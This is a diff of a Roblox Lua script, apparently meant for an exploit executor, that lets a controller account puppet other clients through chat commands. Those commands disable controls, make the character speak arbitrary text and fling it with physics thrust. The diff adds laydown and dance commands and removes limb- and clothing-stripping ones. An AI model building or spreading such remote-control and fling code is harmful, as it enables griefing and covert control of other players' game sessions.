@@ -19,12 +19,12 @@ Ghostplayer = "russelpalodizon"
 :bring all
 :disablecontrol
 :enablecontrol
+:laydown
+:dance
+:dance all
 :fling
 :sit
 :say
-:removearms
-:removelegs
-:nake
 :
 
 ]]------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -64,6 +64,15 @@ elseif admin_msg == ":disablecontrol "..MyName or admin_msg == ":disablecontrol 
    controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls() controls:Disable()
 elseif admin_msg == ":enablecontrol "..MyName or admin_msg == ":enablecontrol "..MyDisplayName then
    controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls() controls:Enable()
+elseif admin_msg == ":laydown "..MyName or admin_msg == ":laydown "..MyDisplayName then
+   game.Players.LocalPlayer.Character.Humanoid.Sit = true
+   task.wait(0.1)
+   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
+   for _, v in ipairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
+     v:Stop()
+   end
+elseif admin_msg == ":dance "..MyName or admin_msg == ":dance "..MyDisplayName or admin_msg == ":dance all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
+   SendMessage("/e dance")
 elseif admin_msg == ":fling "..MyName or admin_msg == ":fling "..MyDisplayName then
    bambam = Instance.new("BodyThrust")
    bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
@@ -78,24 +87,6 @@ elseif string.find(admin_msg, ":say "..MyName.." ") or string.find(admin_msg, ":
       admin_msg = string.gsub(admin_msg, ":say "..MyDisplayName, "")
    end
    SendMessage(admin_msg)
-elseif admin_msg == ":removearms "..MyName or admin_msg == ":removearms "..MyDisplayName then
-   for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-     if v.Name == "Right Arm" or v.Name == "Left Arm" or v.Name == "RightUpperArm" or v.Name == "LeftUpperArm" then
-	    v:Destroy()
-	 end
-   end
-elseif admin_msg == ":removelegs "..MyName or admin_msg == ":removelegs "..MyDisplayName then
-   for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-     if v.Name == "Right Leg" or v.Name == "Left Leg" or v.Name == "RightUpperLeg" or v.Name == "LeftUpperLeg" then
-	    v:Destroy()
-	 end
-   end
-elseif admin_msg == ":nake "..MyName or admin_msg == ":nake "..MyDisplayName then
-   for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-     if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
-	    v:Destroy()
-	 end
-   end
 elseif admin_msg == ":" and MyName ~= Ghostplayer then
    SendMessage("Im Here")
 end
